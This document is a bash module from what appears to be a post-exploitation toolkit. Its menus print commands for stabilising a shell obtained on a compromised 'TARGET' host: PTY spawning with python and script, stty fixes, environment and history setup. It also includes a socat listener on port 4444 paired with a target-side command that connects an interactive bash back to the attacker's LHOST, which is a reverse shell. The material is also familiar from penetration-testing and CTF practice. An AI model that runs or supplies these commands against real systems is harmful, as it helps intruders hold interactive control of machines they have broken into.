#!/bin/bash

################################################################################
# Upgrade Module - PTY Upgrade and Shell Stabilization
################################################################################

upgrade_menu() {
    while true; do
        clear
        echo ""
        echo "SHELL UPGRADE MENU"
        echo "1. Upgrade to PTY (Python)"
        echo "2. Upgrade Shell (Script)"
        echo "3. Fix Environment"
        echo "4. Terminal Features"
        echo "5. Back"
        echo ""
        read -p "Select: " choice
        
        case "$choice" in
            1) upgrade_pty_python ;;
            2) upgrade_pty_script ;;
            3) fix_environment ;;
            4) enable_terminal_features ;;
            5) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

upgrade_pty_python() {
    clear
    echo ""
    echo "=== PYTHON PTY UPGRADE ==="
    echo ""
    echo "Run the following commands on the TARGET shell:"
    echo ""
    echo "  [Step 1] Spawn a PTY:"
    echo "    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo "    python  -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo ""
    echo "  [Step 2] Background the shell & fix your terminal:"
    echo "    Ctrl+Z"
    echo "    stty raw -echo; fg"
    echo ""
    echo "  [Step 3] Fix the environment inside the target shell:"
    echo "    export TERM=xterm-256color"
    echo "    stty rows $(tput lines 2>/dev/null || echo 24) cols $(tput cols 2>/dev/null || echo 80)"
    echo "    reset"
    echo ""
    read -p "Press Enter to return..."
}

upgrade_pty_script() {
    clear
    echo ""
    echo "=== SCRIPT PTY UPGRADE ==="
    echo ""
    echo "Run the following commands on the TARGET shell:"
    echo ""
    echo "  [Step 1] Spawn PTY using script:"
    echo "    script -qc /bin/bash /dev/null"
    echo ""
    echo "  [Step 2] Background & fix terminal (on ATTACKER):"
    echo "    Ctrl+Z"
    echo "    stty raw -echo; fg"
    echo ""
    echo "  [Step 3] Fix environment:"
    echo "    export TERM=xterm-256color"
    echo "    stty rows $(tput lines 2>/dev/null || echo 24) cols $(tput cols 2>/dev/null || echo 80)"
    echo ""
    echo "  Alternative — socat full TTY (if socat available on target):"
    echo "    Attacker : socat file:\`tty\`,raw,echo=0 tcp-listen:4444"
    echo "    Target   : socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444"
    echo ""
    read -p "Press Enter to return..."
}

fix_environment() {
    clear
    echo ""
    echo "=== FIX SHELL ENVIRONMENT ==="
    echo ""
    echo "Paste these commands into the target shell to fix the environment:"
    echo ""
    echo "  export TERM=xterm-256color"
    echo "  export HOME=/root"
    echo "  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    echo "  export SHELL=/bin/bash"
    echo ""

    local rows cols
    rows=$(tput lines 2>/dev/null || echo 24)
    cols=$(tput cols 2>/dev/null || echo 80)

    echo "  # Set terminal size to match your current window ($rows rows x $cols cols):"
    echo "  stty rows ${rows} cols ${cols}"
    echo ""
    echo "  # Reload shell profile (if available):"
    echo "  source /etc/profile 2>/dev/null; source ~/.bashrc 2>/dev/null"
    echo ""
    echo "  # Reset terminal rendering:"
    echo "  reset"
    echo ""
    read -p "Press Enter to return..."
}

enable_terminal_features() {
    clear
    echo ""
    echo "=== ENABLE TERMINAL FEATURES ==="
    echo ""
    echo "Paste into target shell to enable history & colours:"
    echo ""
    echo "  # Command history"
    echo "  export HISTFILE=~/.bash_history"
    echo "  export HISTSIZE=1000"
    echo "  export HISTFILESIZE=2000"
    echo "  shopt -s histappend"
    echo "  PROMPT_COMMAND='history -a'"
    echo ""
    echo "  # Coloured prompt"
    echo "  export PS1='\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '"
    echo ""
    echo "  # Useful aliases"
    echo "  alias ll='ls -la --color=auto'"
    echo "  alias grep='grep --color=auto'"
    echo ""
    echo "  # Tab completion (if readline is available)"
    echo "  bind 'set completion-ignore-case on' 2>/dev/null"
    echo ""
    read -p "Press Enter to return..."
}


